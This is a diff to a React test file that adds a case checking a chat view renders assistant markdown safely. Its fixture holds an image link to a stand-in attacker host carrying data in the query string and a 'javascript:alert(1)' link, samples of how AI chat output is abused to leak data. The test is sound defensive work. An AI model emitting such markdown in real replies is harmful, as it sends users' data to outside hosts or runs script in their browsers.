@@ -63,6 +63,41 @@ describe('ChatConversationView', () => {
     mockRefreshAiCredits.mockResolvedValue(undefined);
   });
 
+  // The floating chat window renders this same view, so it is covered here too (JEF-548).
+  describe('model text with an image or an unsafe link (JEF-548)', () => {
+    it('shows an assistant image as its alt text and an unsafe link as text, fetching and linking nothing', async () => {
+      mockGqlRequest.mockResolvedValue({
+        chatHistory: [
+          { id: 'm1', role: 'user', content: 'summarise my notes', createdAt: '', proposals: [] },
+          {
+            id: 'm2',
+            role: 'assistant',
+            content:
+              'They liked your portfolio. ![status](https://evil.example/b?d=165000) ' +
+              '[verify](javascript:alert(1)) [site](https://evil.example/verify)',
+            createdAt: '',
+            proposals: [],
+          },
+        ],
+      });
+
+      const { container } = render(
+        <ChatConversationView conversationId="c1" onConversationCreated={vi.fn()} />,
+        { wrapper: Wrapper },
+      );
+
+      expect(await screen.findByText(/They liked your portfolio/)).toBeInTheDocument();
+      expect(container.querySelector('img')).toBeNull();
+      expect(container.innerHTML).not.toContain('b?d=165000');
+      expect(container.querySelector('[href^="javascript:"]')).toBeNull();
+      // A safe https link stays, with the host it goes to shown beside it.
+      expect(screen.getByRole('link', { name: /site/ })).toHaveAttribute(
+        'href',
+        'https://evil.example/verify',
+      );
+    });
+  });
+
   describe('AI credits meter (JEF-511)', () => {
     const sendHello = () => {
       fireEvent.change(screen.getByPlaceholderText('Ask a question…'), {
